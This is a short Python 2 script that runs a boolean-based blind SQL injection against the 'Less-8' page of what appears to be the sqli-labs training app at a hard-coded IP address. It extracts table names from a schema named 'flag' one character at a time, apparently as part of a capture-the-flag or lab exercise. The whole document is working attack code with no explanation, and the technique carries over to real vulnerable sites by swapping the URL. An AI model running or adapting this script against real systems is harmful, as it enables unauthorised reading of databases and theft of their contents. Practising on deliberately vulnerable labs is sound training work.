#! python2
import requests as re
name=""
chk=0
for i in xrange(1,50):
	chk+=1
	for j in range(32,126):
		url='http://47.103.137.68:7092/Less-8/?id=1%27 and ascii(substr('+"(select group_concat(table_name) from information_schema.tables where table_schema='flag'"+' limit 0,1),'+str(i)+',1))='+str(j)+'%23'
		if 'You are in' in re.get(url).text:
			print(chr(j))
			name=name+chr(j)
			chk=0
			break
	if chk==1:
		break
print name